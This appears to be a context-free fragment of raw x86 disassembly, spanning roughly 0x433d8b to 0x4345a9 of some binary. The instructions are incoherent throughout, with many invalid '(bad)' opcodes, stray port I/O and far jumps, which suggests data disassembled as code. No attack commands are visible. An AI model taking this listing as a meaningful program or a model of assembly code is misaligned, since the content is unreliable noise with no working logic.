  433d8b:	and    BYTE PTR [esi+0x48a6fe6e],cl
  433d91:	gs mov esp,0xef94ec3e
  433d97:	add    BYTE PTR [ebx+eax*2+0x0],cl
  433d9b:	repz push esi
  433d9d:	push   ebp
  433d9e:	inc    edi
  433d9f:	imul   ecx,DWORD PTR [eax-0x4dbae66],0x7e
  433da6:	fwait
  433da7:	int3   
  433da8:	xchg   edx,eax
  433da9:	or     dl,BYTE PTR [eax+ebp*1-0x58]
  433dad:	ins    BYTE PTR es:[edi],dx
  433dae:	push   cs
  433daf:	or     al,BYTE PTR [esi+edx*1]
  433db2:	sub    cl,BYTE PTR [esi+0x40eab626]
  433db8:	mov    dl,0x5e
  433dba:	push   edx
  433dbb:	fild   DWORD PTR [edx-0x4e2fc8a8]
  433dc1:	or     DWORD PTR [edi+0x438cb152],esp
  433dc7:	ins    DWORD PTR es:[edi],dx
  433dc8:	jl     0x433e03
  433dca:	cmp    al,0x4c
  433dcc:	in     al,0x50
  433dce:	inc    ecx
  433dcf:	shl    DWORD PTR [eax-0x657289cb],0x3b
  433dd6:	popf   
  433dd7:	into   
  433dd8:	mov    eax,0x30c8b104
  433ddd:	outs   dx,BYTE PTR ds:[esi]
  433dde:	and    cl,bl
  433de0:	int3   
  433de1:	sub    BYTE PTR [ebp-0x31907d60],dh
  433de7:	mov    es,WORD PTR [esi+0x12f6d200]
  433ded:	(bad)  
  433dee:	and    BYTE PTR [ebx],cl
  433df0:	inc    edx
  433df1:	or     ebp,esp
  433df3:	int3   
  433df4:	loopne 0x433e00
  433df6:	pusha  
  433df7:	inc    ebx
  433df8:	adc    eax,0x5f6d48f4
  433dfd:	rcl    BYTE PTR [ecx+0x4078ba06],1
  433e03:	adc    eax,0x2f9a15a
  433e08:	jnp    0x433d94
  433e0a:	inc    esp
  433e0b:	jo     0x433ddd
  433e0d:	ss jb  0x433e8d
  433e10:	add    BYTE PTR [edi+0x46532fea],dh
  433e16:	jnp    0x433e85
  433e18:	sbb    bh,dh
  433e1a:	push   0x34
  433e1c:	(bad)  
  433e1d:	push   esp
  433e1e:	cwde   
  433e1f:	mov    al,0xed
  433e21:	js     0x433e5f
  433e23:	pop    esi
  433e24:	repnz pop ebx
  433e26:	pop    eax
  433e27:	out    0xf4,al
  433e29:	and    ebx,eax
  433e2b:	in     al,dx
  433e2c:	jb     0x433e12
  433e2e:	outs   dx,BYTE PTR ds:[esi]
  433e2f:	inc    ebp
  433e30:	fsubr  DWORD PTR [edx]
  433e32:	push   cs
  433e33:	or     al,0xed
  433e35:	mov    cl,0x94
  433e37:	xchg   edx,eax
  433e38:	sbb    al,BYTE PTR [ebp-0x4e]
  433e3b:	jae    0x433e93
  433e3d:	mov    al,ds:0x9cfad030
  433e42:	fs pop edx
  433e44:	jg     0x433dda
  433e46:	and    eax,DWORD PTR [edx]
  433e48:	int    0x82
  433e4a:	jp     0x433ec4
  433e4c:	or     ebx,DWORD PTR [ecx-0x3f2fc90c]
  433e52:	mov    es,WORD PTR [esi-0x4b47eb47]
  433e58:	cwde   
  433e59:	leave  
  433e5a:	adc    dh,al
  433e5c:	add    esi,esp
  433e5e:	mov    al,ds:0xb5ea0a51
  433e63:	sub    BYTE PTR [eax],0xb8
  433e66:	test   eax,0xb9d05946
  433e6b:	add    bl,ah
  433e6d:	test   al,0xcc
  433e6f:	bound  eax,QWORD PTR [eax-0x75]
  433e72:	call   0x64d2:0x86f29a76
  433e79:	clc    
  433e7a:	sub    BYTE PTR [eax+0x34],dh
  433e7d:	inc    ebp
  433e7e:	dec    edx
  433e7f:	fwait
  433e80:	in     eax,0xd8
  433e82:	shl    BYTE PTR [eax],cl
  433e84:	test   al,0xc3
  433e86:	loopne 0x433e70
  433e88:	cld    
  433e89:	frstor [edx+0x52654e70]
  433e8f:	sti    
  433e90:	add    DWORD PTR [eax+0x4724989e],esp
  433e96:	jmp    0x433e2c
  433e98:	test   eax,0x9f010a4d
  433e9d:	mov    dl,0x5c
  433e9f:	and    al,0x1c
  433ea1:	popf   
  433ea2:	das    
  433ea3:	stos   BYTE PTR es:[edi],al
  433ea4:	adc    eax,0x524d7c12
  433ea9:	jge    0x433ea5
  433eab:	mov    BYTE PTR [esi],al
  433ead:	xchg   ebp,eax
  433eae:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  433eaf:	add    eax,0xd10f2006
  433eb4:	sub    ch,BYTE PTR [ecx]
  433eb6:	pop    es
  433eb7:	fs sub ah,bh
  433eba:	rol    BYTE PTR [ebx+0x33ed5027],1
  433ec0:	sub    al,0x42
  433ec2:	cmp    eax,0xb422a464
  433ec7:	ret    0xb46c
  433eca:	loopne 0x433f36
  433ecc:	scas   eax,DWORD PTR es:[edi]
  433ecd:	call   0xaa8817ba
  433ed2:	or     al,0x1c
  433ed4:	push   eax
  433ed5:	dec    edx
  433ed6:	and    ebp,DWORD PTR [esp+ecx*8+0x61]
  433eda:	loopne 0x433f37
  433edc:	push   ebp
  433edd:	or     edx,edx
  433edf:	test   BYTE PTR [esi+0x18],bh
  433ee2:	jne    0x433ec2
  433ee4:	or     al,BYTE PTR [edx-0x71]
  433ee7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  433ee8:	lods   eax,DWORD PTR ds:[esi]
  433ee9:	xor    ebp,DWORD PTR ss:[ecx+ecx*2-0x749d37cd]
  433ef1:	sub    al,0xb8
  433ef3:	(bad)  
  433ef4:	or     ecx,DWORD PTR [esi-0x50a7a752]
  433efa:	lock xor ebx,ecx
  433efd:	dec    edi
  433efe:	or     BYTE PTR [edi+0x3cb60a25],cl
  433f04:	xor    BYTE PTR [ecx],bl
  433f06:	mov    dh,0xaa
  433f08:	xlat   BYTE PTR ds:[ebx]
  433f09:	cli    
  433f0a:	push   ecx
  433f0b:	(bad)  
  433f0c:	fistp  QWORD PTR [eax+edi*8]
  433f0f:	add    dl,al
  433f11:	mov    ch,0x6e
  433f13:	adc    al,BYTE PTR [edx+0x0]
  433f16:	push   esi
  433f17:	(bad)  
  433f18:	mov    esi,0x617a82d3
  433f1d:	mov    ds:0xfb7c41a6,eax
  433f22:	sbb    al,0x8c
  433f24:	xchg   edi,eax
  433f25:	es push ds
  433f27:	and    dl,BYTE PTR [edi]
  433f29:	cmp    BYTE PTR [esi-0x1ffdbe98],dl
  433f2f:	les    edx,FWORD PTR [edi+0x45fe2aa0]
  433f35:	xchg   DWORD PTR [eax-0x20],edx
  433f38:	mov    dh,0x88
  433f3a:	sbb    BYTE PTR [edx+0x56662ea0],0x35
  433f41:	inc    ecx
  433f42:	pusha  
  433f43:	adc    al,BYTE PTR [edx+0x3a16b4cf]
  433f49:	mov    eax,0xd047051d
  433f4e:	(bad)  
  433f4f:	lods   eax,DWORD PTR ds:[esi]
  433f50:	(bad)  
  433f51:	outs   dx,DWORD PTR ds:[esi]
  433f52:	jb     0x433fd3
  433f54:	data16 out 0x41,al
  433f57:	xchg   ecx,eax
  433f58:	sub    eax,0x2eef2b2
  433f5d:	hlt    
  433f5e:	cwde   
  433f5f:	and    al,BYTE PTR [ebx+edx*1-0x4]
  433f63:	or     BYTE PTR [ebx-0x3bb6afbd],bl
  433f69:	jo     0x433f16
  433f6b:	push   ss
  433f6c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  433f6d:	xlat   BYTE PTR ds:[ebx]
  433f6e:	les    ecx,FWORD PTR [edi]
  433f70:	sub    al,0xc5
  433f72:	inc    ebx
  433f73:	inc    esi
  433f74:	and    al,0x28
  433f76:	inc    esi
  433f77:	add    esp,DWORD PTR [eax-0x41]
  433f7a:	xchg   edx,eax
  433f7b:	push   0x452e0a12
  433f80:	loope  0x433f58
  433f82:	cmc    
  433f83:	adc    ah,BYTE PTR [esi]
  433f85:	ret    
  433f86:	xchg   esp,edx
  433f88:	sti    
  433f89:	and    dh,BYTE PTR [eax]
  433f8b:	add    BYTE PTR [ebp-0x65],cl
  433f8e:	test   DWORD PTR [ebx],edx
  433f90:	mov    cl,0xe
  433f92:	mov    dl,BYTE PTR [esi-0xbd8154]
  433f98:	es or  dh,ah
  433f9b:	or     eax,0xf900b0ce
  433fa0:	out    dx,eax
  433fa1:	inc    edx
  433fa2:	psrad  mm2,QWORD PTR [edi]
  433fa5:	test   al,0xb7
  433fa7:	out    0x33,al
  433fa9:	mov    esp,0x5e84d596
  433fae:	les    edx,FWORD PTR [ecx-0x7de3b563]
  433fb4:	enter  0x4978,0xb5
  433fb8:	sbb    esi,edx
  433fba:	jno    0x433fcc
  433fbc:	rcr    al,1
  433fbe:	push   eax
  433fbf:	push   ebx
  433fc0:	lods   eax,DWORD PTR ds:[esi]
  433fc1:	sbb    eax,0x44106a7a
  433fc6:	(bad)  
  433fc7:	out    dx,eax
  433fc8:	ss dec eax
  433fca:	push   0xab48852
  433fcf:	test   eax,0x722b6000
  433fd4:	jl     0x433fbc
  433fd6:	mov    cl,0x4c
  433fd8:	out    0xfa,eax
  433fda:	add    BYTE PTR [ebp+0x59],dl
  433fdd:	jnp    0x433fb1
  433fdf:	inc    ecx
  433fe0:	ja     0x433f8e
  433fe2:	fs jo  0x433fab
  433fe5:	fild   WORD PTR [ebx]
  433fe7:	jecxz  0x433f9c
  433fe9:	cmp    ah,al
  433feb:	xor    eax,0xb02b0d3e
  433ff0:	and    BYTE PTR [edx],ch
  433ff2:	and    BYTE PTR [edi+eiz*8-0x6f455d78],dh
  433ff9:	or     eax,DWORD PTR [esi+edx*4-0x3]
  433ffd:	cmp    al,0x18
  433fff:	(bad)  
  434000:	call   0xa0aa:0xcd74f6e4
  434007:	add    edx,DWORD PTR [ecx]
  434009:	js     0x433fc7
  43400b:	call   0x1fd0c53c
  434010:	adc    al,0xc6
  434012:	call   0xe307:0x899534b8
  434019:	jl     0x433fa4
  43401b:	mov    eax,0x1850164b
  434020:	cmp    BYTE PTR [ebx+eiz*8-0xc],dl
  434024:	fdivr  QWORD PTR [edx]
  434026:	popa   
  434027:	arpl   WORD PTR [ecx+0x54900ac8],ax
  43402d:	popa   
  43402e:	or     bh,BYTE PTR [edx]
  434030:	sub    eax,0x2e86a7b
  434035:	cmp    bl,BYTE PTR [edx]
  434037:	xor    DWORD PTR [edi+edi*1+0x16fc28be],eax
  43403e:	cli    
  43403f:	mov    bh,0x3f
  434041:	adc    al,0x2d
  434043:	test   BYTE PTR [edi],ah
  434045:	adc    BYTE PTR [ebx],cl
  434047:	adc    dl,BYTE PTR [edi+ecx*8+0x4f0d92c2]
  43404e:	xchg   esi,eax
  43404f:	cmp    al,BYTE PTR [esi+eiz*2]
  434052:	add    dl,BYTE PTR [eax]
  434054:	enter  0x358d,0x6c
  434058:	dec    ebp
  434059:	or     eax,0xb6a636aa
  43405e:	push   0x65
  434060:	in     al,dx
  434061:	es mov ebp,0xa82c7843
  434067:	push   ss
  434068:	dec    esp
  434069:	mov    al,ds:0x3e904116
  43406e:	sub    ebp,0x3ea64a76
  434074:	in     al,dx
  434075:	xchg   esi,eax
  434076:	(bad)  
  434077:	sub    bl,BYTE PTR [edx]
  434079:	mov    edx,0xd8f8060c
  43407e:	je     0x4340b9
  434080:	xchg   esp,eax
  434081:	xor    eax,0xab031e22
  434086:	int3   
  434087:	xor    bh,bl
  434089:	sub    al,0x45
  43408b:	jmp    0xdc60:0xb7d44e90
  434092:	loope  0x4340f9
  434094:	adc    dl,BYTE PTR [edx+0x5445819e]
  43409a:	aas    
  43409b:	mov    bh,0xac
  43409d:	call   0x4de5db2
  4340a2:	nop
  4340a3:	add    al,0x1
  4340a5:	and    bh,BYTE PTR [edx-0x3be71fbd]
  4340ab:	daa    
  4340ac:	or     BYTE PTR [edx],bh
  4340ae:	mov    ds:0x5e2bd9d0,eax
  4340b3:	(bad)  
  4340b4:	add    al,0x10
  4340b6:	jo     0x4340da
  4340b8:	repnz mov dx,0x82f7
  4340bd:	ret    0x1043
  4340c0:	push   0xc35acc80
  4340c5:	adc    ebp,esi
  4340c7:	mov    esi,0x48e2ca90
  4340cc:	xchg   BYTE PTR [edx-0xc],bh
  4340cf:	clc    
  4340d0:	mov    ah,0x3d
  4340d2:	pop    ecx
  4340d3:	mov    ebx,0x2c3ab80e
  4340d8:	(bad)  
  4340d9:	sub    BYTE PTR [ecx-0x4a5eb83],bh
  4340df:	add    bl,BYTE PTR [edx-0x59ff1d24]
  4340e5:	pusha  
  4340e6:	and    BYTE PTR [ecx-0x13275ae0],0x18
  4340ed:	mov    dh,0xa6
  4340ef:	sub    BYTE PTR [esi],bl
  4340f1:	inc    edi
  4340f2:	xchg   esp,eax
  4340f3:	adc    BYTE PTR [esi],0xdc
  4340f6:	pop    ebp
  4340f7:	lock stos BYTE PTR es:[edi],al
  4340f9:	mov    ebp,0x3675b022
  4340fe:	mov    dh,0x46
  434100:	jae    0x4340c1
  434102:	xchg   esp,eax
  434103:	retf   
  434104:	sbb    esp,DWORD PTR [ebx]
  434106:	inc    ecx
  434107:	sub    ebp,DWORD PTR [esp+eax*8+0x790a7cc3]
  43410e:	ss jb  0x4340be
  434111:	mov    cl,BYTE PTR [esi+0x178ae38e]
  434117:	adc    dh,BYTE PTR [esi+edx*8]
  43411a:	mov    eax,ds:0xbac9b034
  43411f:	push   ss
  434120:	shl    BYTE PTR [esi+0x751c0bd0],1
  434126:	push   0xe8ac3d41
  43412b:	dec    ecx
  43412c:	dec    esi
  43412d:	mov    ah,0x7e
  43412f:	xor    eax,0x8c050835
  434134:	cmp    BYTE PTR [ebx+0x4c],al
  434137:	mov    al,0xaa
  434139:	stc    
  43413a:	sbb    esi,DWORD PTR [esi+0x4a]
  43413d:	stos   DWORD PTR es:[edi],eax
  43413e:	addr16 inc esp
  434140:	and    BYTE PTR [eax],al
  434142:	jb     0x4340c9
  434144:	add    BYTE PTR [edi],ah
  434146:	xor    BYTE PTR [edi+0x6fb42140],0xc2
  43414d:	pcmpgtb mm1,QWORD PTR [ebx-0x6e]
  434151:	sbb    eax,0x24aaec02
  434156:	xor    eax,0xb0e2ec2a
  43415b:	or     al,0x4
  43415d:	adc    eax,0xa44e541b
  434162:	jmp    0x43418b
  434164:	xor    al,0x9c
  434166:	int3   
  434167:	mov    dh,dh
  434169:	or     DWORD PTR [ebx],ebp
  43416b:	push   0xffffffa8
  43416d:	loop   0x434161
  43416f:	test   ebp,edx
  434171:	inc    eax
  434172:	mov    fs,WORD PTR [edx+0x6c0f484f]
  434178:	mov    ecx,0xfeb14457
  43417d:	xchg   ebx,eax
  43417e:	mov    BYTE PTR [edi],bl
  434180:	ret    0x4345
  434183:	add    al,0x8d
  434185:	adc    eax,0x6fd80022
  43418a:	loop   0x43412a
  43418c:	ret    
  43418d:	sbb    dl,dl
  43418f:	mov    eax,ds:0x2936cae2
  434194:	call   0xf3a3:0x1676aedc
  43419b:	shl    BYTE PTR [ecx+0xab0a82],1
  4341a1:	inc    esi
  4341a2:	sbb    bh,BYTE PTR [esi+ebx*8+0x79]
  4341a6:	inc    esp
  4341a7:	add    BYTE PTR [edx-0x77dccdc2],bl
  4341ad:	not    esp
  4341af:	add    al,0x28
  4341b1:	xor    bl,BYTE PTR [edx]
  4341b3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4341b4:	cmp    al,0xa0
  4341b6:	pop    ebp
  4341b7:	xor    al,0xf1
  4341b9:	push   ecx
  4341ba:	(bad)  
  4341bb:	(bad)  
  4341bc:	push   ss
  4341bd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4341be:	or     dh,BYTE PTR [edx+0x169cf8dd]
  4341c4:	xor    DWORD PTR [eax],0xc742a07b
  4341ca:	call   0x525e:0x10d78806
  4341d1:	add    al,0xb3
  4341d3:	or     al,0x7a
  4341d5:	pop    es
  4341d6:	icebp  
  4341d7:	and    al,0xe3
  4341d9:	adc    DWORD PTR [esi-0x60818dcc],ebp
  4341df:	xor    eax,0x60a14721
  4341e4:	adc    al,0x6
  4341e6:	call   0x869f:0x430c8a16
  4341ed:	push   edx
  4341ee:	pop    ebp
  4341ef:	test   BYTE PTR ds:0x3052971d,bl
  4341f5:	xchg   esi,eax
  4341f6:	aad    0x3c
  4341f8:	mov    ebp,0x5505ac2
  4341fd:	loopne 0x4341f1
  4341ff:	push   es
  434200:	sub    BYTE PTR [ebx+edi*8+0x75],0xb4
  434205:	sbb    eax,0x3e9b7416
  43420a:	push   ds
  43420b:	cmc    
  43420c:	int3   
  43420d:	mov    bh,0xff
  43420f:	repz out dx,al
  434211:	push   edi
  434212:	test   al,0x25
  434214:	cdq    
  434215:	push   edi
  434216:	pop    esi
  434217:	lock add BYTE PTR [esi+0x754e287b],ch
  43421e:	sbb    BYTE PTR [ecx+0x10],al
  434221:	pusha  
  434222:	cmp    edx,0x5
  434225:	adc    eax,0x5a646801
  43422a:	je     0x43427c
  43422c:	fmul   DWORD PTR [edx+0x5e1c6242]
  434232:	inc    esi
  434233:	mov    al,bl
  434235:	or     eax,0x9087817c
  43423a:	push   ss
  43423b:	jb     0x434290
  43423d:	inc    eax
  43423e:	xchg   edx,eax
  43423f:	push   esp
  434240:	inc    ebp
  434241:	pop    edx
  434242:	sbb    ah,bl
  434244:	mov    ds:0x586c3248,eax
  434249:	call   0x7c7d:0x6aad4505
  434250:	cwde   
  434251:	bound  esp,QWORD PTR [edx]
  434253:	in     al,0x75
  434255:	fmul   QWORD PTR [ebx+0x10]
  434259:	in     eax,dx
  43425a:	adc    eax,0x161efd76
  43425f:	or     al,0x4e
  434261:	mov    ds:0x64ae8a8a,al
  434266:	dec    edx
  434267:	dec    dl
  434269:	test   DWORD PTR [edx],esp
  43426b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  43426c:	ds sbb eax,0x84a6d9ad
  434272:	retf   0xc60f
  434275:	jbe    0x4342e1
  434277:	call   0xe1bd034
  43427c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  43427d:	aam    0x1a
  43427f:	push   cs
  434280:	push   cs
  434281:	sbb    dh,BYTE PTR [edx-0x60b5a3ea]
  434287:	xchg   esi,eax
  434288:	mov    al,BYTE PTR [ecx]
  43428a:	cwde   
  43428b:	sar    dh,0x9a
  43428e:	scas   al,BYTE PTR es:[edi]
  43428f:	and    DWORD PTR [eax+esi*4+0x1f64f464],ebp
  434296:	push   0x4e
  434298:	cli    
  434299:	pop    edi
  43429a:	ficomp DWORD PTR [eax+eax*4]
  43429d:	enter  0xf728,0x71
  4342a1:	push   0x842eb2a6
  4342a6:	adc    eax,0xda5cc564
  4342ab:	fdivrp st(6),st
  4342ad:	leave  
  4342ae:	pop    edx
  4342af:	in     al,0xd8
  4342b1:	dec    edx
  4342b2:	add    al,0xff
  4342b4:	sahf   
  4342b5:	scas   eax,DWORD PTR es:[edi]
  4342b6:	sub    edi,edx
  4342b8:	inc    esp
  4342b9:	jmp    0x776b5842
  4342be:	push   eax
  4342bf:	(bad)  
  4342c0:	and    eax,ebp
  4342c2:	or     DWORD PTR [edx-0x30],ebx
  4342c5:	aas    
  4342c6:	jae    0x4342fa
  4342c8:	and    ch,BYTE PTR [edx+0x1a]
  4342cb:	add    al,al
  4342cd:	and    BYTE PTR [esi],0xe6
  4342d0:	shl    DWORD PTR [ebx],cl
  4342d2:	test   eax,0xaeb8b00d
  4342d7:	jmp    0x50e0:0xbc158bf
  4342de:	sbb    esp,edi
  4342e0:	fs data16 jp 0x4342e4
  4342e4:	adc    DWORD PTR [esi+0x529d036b],edx
  4342ea:	adc    al,0x3a
  4342ec:	adc    BYTE PTR [eax],ch
  4342ee:	pop    eax
  4342ef:	and    BYTE PTR [eax-0x39],bh
  4342f2:	xor    al,0x7f
  4342f4:	cmp    al,0x8d
  4342f6:	add    BYTE PTR [edx-0x71f9b12c],ch
  4342fc:	sar    BYTE PTR [edx-0x4e],1
  4342ff:	jle    0x43429b
  434301:	adc    al,0x87
  434303:	and    bl,BYTE PTR [edx]
  434305:	dec    edi
  434306:	xchg   edx,eax
  434307:	rcl    DWORD PTR [eax],cl
  434309:	ins    BYTE PTR es:[edi],dx
  43430a:	push   ss
  43430b:	sub    BYTE PTR [esi-0x22],cl
  43430e:	test   BYTE PTR [eax-0x69e2bff9],cl
  434314:	push   ds
  434315:	mov    dl,0xef
  434317:	fs mov ah,0x26
  43431a:	adc    eax,0x9429d694
  43431f:	mov    dl,0x45
  434321:	fist   WORD PTR [edx+ebp*1]
  434324:	push   esp
  434325:	push   edi
  434326:	jle    0x434398
  434328:	push   0xa29ad675
  43432d:	ins    DWORD PTR es:[edi],dx
  43432e:	fs fs stc 
  434331:	cs cdq 
  434333:	dec    esp
  434334:	call   0xb8ec:0x94a346a5
  43433b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  43433c:	mov    dh,0xe6
  43433e:	sub    BYTE PTR [edi],ch
  434340:	mul    BYTE PTR [ebx+edx*1]
  434343:	scas   al,BYTE PTR es:[edi]
  434344:	push   ds
  434345:	sub    DWORD PTR [ecx+0x3f],eax
  434348:	or     eax,0x52fbc834
  43434d:	or     DWORD PTR [esi+0x6a],ecx
  434350:	mov    al,0xa3
  434352:	cmp    eax,0x984cc68c
  434357:	test   al,0xca
  434359:	loope  0x434346
  43435b:	loopne 0x4343aa
  43435d:	je     0x434369
  43435f:	stos   BYTE PTR es:[edi],al
  434360:	mov    ds:0xdac0ce56,al
  434365:	imul   ebx,DWORD PTR [ebx],0x3f
  434368:	pop    esp
  434369:	ins    BYTE PTR es:[edi],dx
  43436a:	dec    edx
  43436b:	mov    eax,0x34dce970
  434370:	dec    ebx
  434371:	sbb    eax,0xbc56925f
  434376:	ficom  DWORD PTR [ecx]
  434378:	popa   
  434379:	loope  0x434328
  43437b:	dec    edx
  43437c:	scas   al,BYTE PTR es:[edi]
  43437d:	xchg   ebx,eax
  43437e:	data16 adc ah,0x8a
  434382:	(bad)  
  434383:	loopne 0x4343ba
  434385:	sub    cl,bl
  434387:	call   0xe392820e
  43438c:	mov    ch,0xf1
  43438e:	outs   dx,DWORD PTR ds:[esi]
  434390:	dec    ecx
  434391:	push   es
  434392:	mov    bl,0xd6
  434394:	jle    0x434397
  434396:	sbb    BYTE PTR [esi-0x4562f42e],cl
  43439c:	add    BYTE PTR [edx],dh
  43439e:	mov    WORD PTR [eax+0x560d269e],es
  4343a4:	lods   al,BYTE PTR ds:[esi]
  4343a5:	inc    edx
  4343a6:	(bad)  
  4343a7:	int    0xf4
  4343a9:	xor    eax,DWORD PTR [eax]
  4343ab:	and    dl,cl
  4343ad:	push   0x12c54b7c
  4343b2:	sbb    bh,BYTE PTR [ebx+edi*8+0x1f8c4f94]
  4343b9:	ss pop esi
  4343bb:	push   0x25
  4343bd:	lea    esp,[eax+0x47]
  4343c0:	retf   0x5527
  4343c3:	pusha  
  4343c4:	pop    ds
  4343c5:	xor    al,0x83
  4343c7:	lahf   
  4343c8:	out    dx,al
  4343c9:	xchg   esi,eax
  4343ca:	add    DWORD PTR [esp+eax*8+0x6],ebp
  4343ce:	pop    ss
  4343cf:	and    DWORD PTR [eax+edi*1-0x34],esi
  4343d3:	cld    
  4343d4:	ror    BYTE PTR [ecx-0x1e],1
  4343d7:	shl    DWORD PTR [esp+edx*4+0x3c],1
  4343db:	mov    BYTE PTR [ecx+0x60487535],al
  4343e1:	and    al,0xb5
  4343e3:	xchg   esp,eax
  4343e4:	cli    
  4343e5:	sbb    BYTE PTR cs:[ebx+ebx*1],dh
  4343e9:	cmp    bl,BYTE PTR [edx-0x58]
  4343ec:	cmp    al,0x8a
  4343ef:	cmp    dl,dh
  4343f1:	dec    DWORD PTR [ecx]
  4343f3:	mov    esi,0x493f66a6
  4343f8:	jmp    0x408e:0x6a94a1d1
  4343ff:	inc    edx
  434400:	aam    0x82
  434402:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  434403:	xor    BYTE PTR [edx+0x48d6cca0],0xd2
  43440a:	mov    eax,ds:0x6f54eda4
  43440f:	push   edx
  434410:	xor    BYTE PTR [eax+0x6a09b404],0xd
  434417:	lds    ebx,FWORD PTR [esi]
  434419:	call   0x59a80cb0
  43441e:	and    eax,0x6e3d35b4
  434423:	mov    BYTE PTR [ebx+edx*8],al
  434426:	mov    esi,0xa9785925
  43442b:	fild   DWORD PTR [esi-0x2b]
  43442e:	call   0xbdda37ff
  434433:	ins    DWORD PTR es:[edi],dx
  434434:	cmp    BYTE PTR [edi*1+0x15302446],ah
  43443b:	add    al,BYTE PTR [ebx+0x50]
  43443e:	push   ds
  43443f:	out    dx,eax
  434440:	test   BYTE PTR [esi+ebp*1+0x8cd6abd],bh
  434447:	jmp    0x85ac:0x24960021
  43444e:	inc    eax
  43444f:	jb     0x4344cd
  434451:	inc    edi
  434452:	sbb    DWORD PTR [edx+0x48e3d4a2],0xffffffb7
  434459:	xor    eax,DWORD PTR [eax]
  43445b:	out    0x11,al
  43445d:	push   ebp
  43445e:	sub    BYTE PTR [eax-0x33],0x70
  434462:	xchg   esp,eax
  434463:	cmp    ah,BYTE PTR [ebx+0xaa63474]
  434469:	sahf   
  43446a:	or     DWORD PTR [eax-0x4447f3cc],ebx
  434470:	pop    esi
  434471:	inc    ecx
  434472:	inc    ebp
  434473:	push   eax
  434474:	frstor [esi-0xcf1473f]
  43447a:	add    ah,ch
  43447c:	test   al,0x6a
  43447e:	call   0xe4ca:0xa88bfa8d
  434485:	out    0x75,eax
  434487:	(bad)  
  434488:	adc    al,0xf6
  43448a:	inc    eax
  43448b:	fcmovbe st,st(1)
  43448d:	pop    eax
  43448e:	repnz hlt 
  434490:	or     al,0x1c
  434492:	or     al,BYTE PTR [edx+0x1]
  434495:	sbb    eax,0x706ce5f6
  43449a:	add    BYTE PTR [eax+0x33],ah
  43449d:	or     ah,dl
  43449f:	test   al,0x63
  4344a1:	(bad)  
  4344a2:	fwait
  4344a3:	jge    0x4344e5
  4344a5:	pop    edx
  4344a6:	rcl    DWORD PTR [eax-0x50],1
  4344a9:	adc    BYTE PTR [esi+0x17],al
  4344ac:	push   edx
  4344ad:	pop    esi
  4344ae:	hlt    
  4344af:	adc    dh,BYTE PTR [esi]
  4344b1:	xor    al,0xbe
  4344b3:	jmp    0x6a60:0xd8c6367a
  4344ba:	mov    ebp,DWORD PTR [edx+0xae058d2]
  4344c0:	cld    
  4344c1:	push   edx
  4344c2:	mov    al,ds:0xd0342510
  4344c7:	push   ebp
  4344c8:	in     al,0xf0
  4344ca:	clc    
  4344cb:	jno    0x434467
  4344cd:	mov    es,WORD PTR [edx]
  4344cf:	adc    al,0x99
  4344d1:	clc    
  4344d2:	mov    al,0x5b
  4344d4:	hlt    
  4344d5:	icebp  
  4344d6:	xor    BYTE PTR ds:0x9aa00a9a,ch
  4344dc:	inc    eax
  4344dd:	test   al,0xac
  4344df:	jg     0x434482
  4344e1:	inc    ecx
  4344e2:	rcl    cl,0xa1
  4344e5:	mov    WORD PTR [edx],?
  4344e7:	(bad)  
  4344e9:	add    cl,BYTE PTR [edi+0x255051db]
  4344ef:	jbe    0x4344cf
  4344f1:	xor    dl,BYTE PTR [edx]
  4344f3:	loop   0x43455b
  4344f5:	out    0x66,al
  4344f7:	xchg   esp,eax
  4344f8:	sbb    eax,0x2947a26e
  4344fd:	popa   
  4344fe:	shufps xmm4,XMMWORD PTR [edx+0x755a6481],0xa1
  434506:	jge    0x4344fc
  434508:	mov    ebx,0x1c5b11c0
  43450d:	xchg   edx,eax
  43450e:	pop    edx
  43450f:	rcl    DWORD PTR [esp+ebp*1-0x5b],1
  434513:	mov    bl,bh
  434515:	call   0xe9b1:0x7af296
  43451c:	mov    ?,WORD PTR [ecx]
  43451e:	jo     0x4344cc
  434520:	mov    ecx,0xac02e500
  434525:	jo     0x434540
  434527:	les    esi,FWORD PTR [edx-0x4aa771b9]
  43452d:	xchg   DWORD PTR [eax],esi
  43452f:	call   0x7cf4:0xd69a4a2e
  434536:	das    
  434537:	or     ebp,DWORD PTR [edx]
  434539:	or     bl,BYTE PTR [edx]
  43453b:	jne    0x4344cd
  43453d:	test   BYTE PTR [eax-0x72],al
  434540:	scas   al,BYTE PTR es:[edi]
  434541:	pop    edx
  434542:	test   al,0x55
  434544:	add    DWORD PTR [ecx-0x6763b499],ebp
  43454a:	dec    esp
  43454b:	push   0x3a50d3ed
  434550:	dec    eax
  434551:	bound  eax,QWORD PTR [edx+0x37dca14]
  434557:	jp     0x434561
  434559:	in     al,dx
  43455a:	sar    al,cl
  43455c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  43455d:	xor    dl,bh
  43455f:	jbe    0x4345d7
  434561:	test   al,0x61
  434563:	jl     0x434527
  434565:	cld    
  434566:	adc    BYTE PTR [edx+0x3c006824],cl
  43456c:	xor    al,0xd4
  43456e:	cmp    cl,BYTE PTR [eax-0xb51411c]
  434574:	dec    eax
  434575:	fidivr DWORD PTR [esi]
  434577:	int3   
  434578:	es push ss
  43457a:	or     BYTE PTR [ecx],dh
  43457c:	and    BYTE PTR [ecx-0x5c],al
  43457f:	pusha  
  434580:	inc    ebx
  434581:	mov    ebx,0x640aeea4
  434586:	inc    edi
  434587:	ret    0x9191
  43458a:	sub    BYTE PTR [ecx],ah
  43458c:	je     0x434529
  43458e:	pushf  
  43458f:	or     dl,BYTE PTR [ebp-0x5977e853]
  434595:	sbb    BYTE PTR [esi],bl
  434597:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  434598:	ss cwde 
  43459a:	pusha  
  43459b:	imul   esp,edx,0x6c
  43459e:	jmp    0x1a4fbe2e
  4345a3:	outs   dx,BYTE PTR ds:[esi]
  4345a4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4345a5:	push   esi
  4345a6:	and    BYTE PTR [ecx+0x68],dl
  4345a9:	mov    al,ds:0xfa3aaca2
